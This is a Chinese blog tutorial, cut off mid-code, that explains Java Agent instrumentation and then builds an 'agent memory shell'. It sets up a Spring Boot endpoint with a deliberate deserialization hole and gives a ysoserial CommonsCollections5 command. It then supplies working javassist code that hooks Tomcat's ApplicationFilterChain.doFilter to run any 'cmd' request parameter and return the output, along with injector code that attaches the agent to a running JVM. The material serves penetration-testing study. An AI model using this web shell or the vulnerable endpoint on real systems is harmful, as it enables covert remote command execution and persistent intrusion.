    <content type="html"><![CDATA[<h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，<strong>通过 java.lang.instrument 实现的工具我们称之为 Java Agent</strong> ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法</p><p>Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去</p><p>说白了 Java Agent 只是一个 Java 类而已，只不过普通的 Java 类是以 main 函数作为入口点的，Java Agent 的入口点则是 premain 和 agentmain</p><p>Java Agent 支持两种方式进行加载：</p><ol><li>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</li><li>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）</li></ol><a id="more"></a><h3 id="启动时加载-agent"><a href="#启动时加载-agent" class="headerlink" title="启动时加载 agent"></a>启动时加载 agent</h3><p>premain 方法顾名思义，会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 Premain-Class 类中的 premain 方法</p><p>Burpsuite破解版启动时-javaagent参数使用的就是这个方法，下面举一个实际的例子</p><p>JDK 1.8.311</p><p>idea创建pom项目</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello World"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单栏File-&gt;project stucture，添加Artifacts，选择执行的Main Class</p><p><img src="/2022/05/26/Java-10/aGOMB_n_kACRcvX2UDO-kP61hyQWrRv4sQ5gyRUugWI.png" alt="image"></p><p>然后菜单栏Build-&gt;Build Artifacts，在out目录下可以看到生成的jar文件</p><p><img src="/2022/05/26/Java-10/20ebFQBYSnOA_NaJVoxqHlY-fSnpPy1Hd4GlWNTNBAk.png" alt="image"></p><p>创建PremainDemo类，实现premain方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PremainDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String aegntArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"premain method is hooked!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MANIFEST.MF，指定Premain-Class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: PremainDemo</span><br></pre></td></tr></table></figure><p>这里使用纯java命令来打包，javac将java文件编译成class文件后，使用jar打包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm agent.jar MANIFEST.MF PremainDemo<span class="class">.<span class="keyword">class</span></span></span><br></pre></td></tr></table></figure><p>添加<code>-javaagent</code> 参数，premain在main函数之前执行成功</p><p><img src="/2022/05/26/Java-10/SrPFYGcZdwK9OdVOvC1QKDRBJyq5BlwD2vZHkQvUMWY.png" alt="image"></p><p>在实际渗透测试的过程中肯定不能采用这样的方式，所以还是需要启动后加载</p><h3 id="动态修改字节码"><a href="#动态修改字节码" class="headerlink" title="动态修改字节码"></a>动态修改字节码</h3><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>在实现 premain 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果</p><p>Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码，更加详细的介绍和方法，可以参照<a href="https://docs.oracle.com/javase/9/docs/api/java/lang/instrument/package-summary.html" target="_blank" rel="noopener">官方文档</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="addTransformer"><a href="#addTransformer" class="headerlink" title="addTransformer"></a>addTransformer</h5><p>addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册提供的转换器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span></span><br></pre></td></tr></table></figure><p>这样当类加载的时候，会进入我们自己的 Transformer 中的 transform 函数进行拦截</p><p><img src="/2022/05/26/Java-10/sIrVZUR-OO6A2T55v0W_1hsxpeTN0AKoHp0ibz6g7xw.png" alt="image"></p><h5 id="getAllLoadedClasses"><a href="#getAllLoadedClasses" class="headerlink" title="getAllLoadedClasses"></a>getAllLoadedClasses</h5><p>getAllLoadedClasses 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class</p><p><img src="/2022/05/26/Java-10/0mHSpHusuEX2B8gLJsyh3Y6ksE7wpVitwGubba6A7-s.png" alt="image"></p><h5 id="retransformClasses"><a href="#retransformClasses" class="headerlink" title="retransformClasses"></a>retransformClasses</h5><p>retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果</p><p><img src="/2022/05/26/Java-10/LQ9cOwEz_8HnQ20S-dOuNV6vqWXYgyeRVHlpC_Tg4Ys.png" alt="image"></p><h3 id="启动后加载agent"><a href="#启动后加载agent" class="headerlink" title="启动后加载agent"></a>启动后加载agent</h3><p>在 jdk 1.6 中实现了attach-on-demand（按需附着），我们可以使用 Attach API 动态加载 agent，主要涉及VirtualMachine这个类，有以下几个重要的方法</p><p><strong>Attach</strong> ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualMachine vm &#x3D; VirtualMachine.attach(v.id());</span><br></pre></td></tr></table></figure><p><strong>loadAgent</strong>：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。</p><p><strong>Detach</strong>：从 JVM 上面解除一个代理(agent)</p><p>大概流程就是：通过 VirtualMachine 类的 attach(pid) 方法，可以 attach 到一个运行中的 java 进程上，之后便可以通过 loadAgent(agentJarPath) 来将agent 的 jar 包注入到对应的进程，然后对应的进程会调用agentmain方法。</p><p><img src="/2022/05/26/Java-10/0XzoegTtVE83fYSHvTnlbXwbw6r8QtMv0LD8xh188xk.png" alt="image"></p><p>Demo</p><p>AgentMainDemo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DefineTransformer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(className);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MANIFEST.MF</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="keyword">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="keyword">true</span></span><br><span class="line">Agent-Class: AgentMainDemo</span><br></pre></td></tr></table></figure><p>如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can-Retransform-Classes 是否支持类的重新替换</span><br><span class="line">Can-Redefine-Classes 是否支持类的重新定义</span><br></pre></td></tr></table></figure><p>打包agent.jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm agent.jar MANIFEST.MF AgentMainDemo<span class="class">.<span class="keyword">class</span> <span class="title">DefineTransformer</span>.<span class="title">class</span></span></span><br></pre></td></tr></table></figure><p>测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String path = <span class="string">"/Users/str3am/Documents/Projects/agent-test/src/main/java/agent.jar"</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v : list) &#123;</span><br><span class="line">            <span class="comment">//System.out.println(v.displayName());</span></span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">"Main"</span>)) &#123;</span><br><span class="line">                <span class="comment">// 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接</span></span><br><span class="line">                VirtualMachine vm = VirtualMachine.attach(v.id());</span><br><span class="line">                System.out.println(<span class="string">"id - &gt;&gt;&gt; "</span> + v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/26/Java-10/JCscSiPX1SgO9AZvxvU97IU__JNFFYmaZ5D572N9z5s.png" alt="image"></p><p>这里只是Demo测试，输出了加载的类名</p><h2 id="Agent-Memory-Shell"><a href="#Agent-Memory-Shell" class="headerlink" title="Agent Memory Shell"></a>Agent Memory Shell</h2><p>搭建一个cc5的springboot环境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.agentmemoryshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Vuln</span><span class="params">(String payload)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(payload)));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.5.13&lt;/version&gt;</span><br><span class="line">    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">&lt;/parent&gt;        </span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>yso cc5直接打，传base64之后的payload需要再urlencode一次，因为浏览器对<code>+</code> 号的处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar CommonsCollections5 <span class="string">"open -a calculator"</span> | base64</span><br></pre></td></tr></table></figure><p><a href="https://github.com/KpLi0rn/AgentMemShell" target="_blank" rel="noopener">https://github.com/KpLi0rn/AgentMemShell</a>，编写agent，直接劫持doFilter函数</p><p>AgentMain.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ClassName = <span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> </span>&#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> DefineTransformer(),<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> Class[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DefineTransformer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ClassName = <span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">"/"</span>,<span class="string">"."</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">"Find the Inject Class: "</span> + ClassName);</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                CtClass c = pool.getCtClass(className);</span><br><span class="line">                CtMethod m = c.getDeclaredMethod(<span class="string">"doFilter"</span>);</span><br><span class="line">                m.insertBefore(<span class="string">"javax.servlet.http.HttpServletRequest req =  request;\n"</span> +</span><br><span class="line">                        <span class="string">"javax.servlet.http.HttpServletResponse res = response;\n"</span> +</span><br><span class="line">                        <span class="string">"java.lang.String cmd = request.getParameter(\"cmd\");\n"</span> +</span><br><span class="line">                        <span class="string">"if (cmd != null)&#123;\n"</span> +</span><br><span class="line">                        <span class="string">"    try &#123;\n"</span> +</span><br><span class="line">                        <span class="string">"        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n"</span> +</span><br><span class="line">                        <span class="string">"        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n"</span> +</span><br><span class="line">                        <span class="string">"        String line;\n"</span> +</span><br><span class="line">                        <span class="string">"        StringBuilder sb = new StringBuilder(\"\");\n"</span> +</span><br><span class="line">                        <span class="string">"        while ((line=reader.readLine()) != null)&#123;\n"</span> +</span><br><span class="line">                        <span class="string">"            sb.append(line).append(\"\\n\");\n"</span> +</span><br><span class="line">                        <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                        <span class="string">"        response.getOutputStream().print(sb.toString());\n"</span> +</span><br><span class="line">                        <span class="string">"        response.getOutputStream().flush();\n"</span> +</span><br><span class="line">                        <span class="string">"        response.getOutputStream().close();\n"</span> +</span><br><span class="line">                        <span class="string">"    &#125; catch (Exception e)&#123;\n"</span> +</span><br><span class="line">                        <span class="string">"        e.printStackTrace();\n"</span> +</span><br><span class="line">                        <span class="string">"    &#125;\n"</span> +</span><br><span class="line">                        <span class="string">"&#125;"</span>);</span><br><span class="line">                <span class="keyword">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包成jar文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn assembly:assembly</span><br></pre></td></tr></table></figure><p>使用自定义代码的ysoserial注入agent，<a href="https://github.com/KpLi0rn/ysoserial" target="_blank" rel="noopener">https://github.com/KpLi0rn/ysoserial</a></p><p>agent.java</p><p>由于 tools.jar 并不会在 JVM 启动的时候默认加载，所以这里利用 URLClassloader 来加载我们的 tools.jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    java.lang.String path = <span class="string">"/Users/str3am/Downloads/AgentMemShell/target/AgentMain-1.0-SNAPSHOT-jar-with-dependencies.jar"</span>;</span><br><span class="line">    java.io.File toolsPath = <span class="keyword">new</span> java.io.File(System.getProperty(<span class="string">"java.home"</span>).replace(<span class="string">"jre"</span>,<span class="string">"lib"</span>) + java.io.File.separator + <span class="string">"tools.jar"</span>);</span><br><span class="line">    java.net.URL url = toolsPath.toURI().toURL();</span><br><span class="line">    java.net.URLClassLoader classLoader = <span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;url&#125;);</span><br><span class="line">    Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="string">"com.sun.tools.attach.VirtualMachine"</span>);</span><br><span class="line">    Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">"com.sun.tools.attach.VirtualMachineDescriptor"</span>);</span><br><span class="line">    java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod(<span class="string">"list"</span>,<span class="keyword">null</span>);</span><br><span class="line">    java.util.List<span class="comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">"Running JVM list 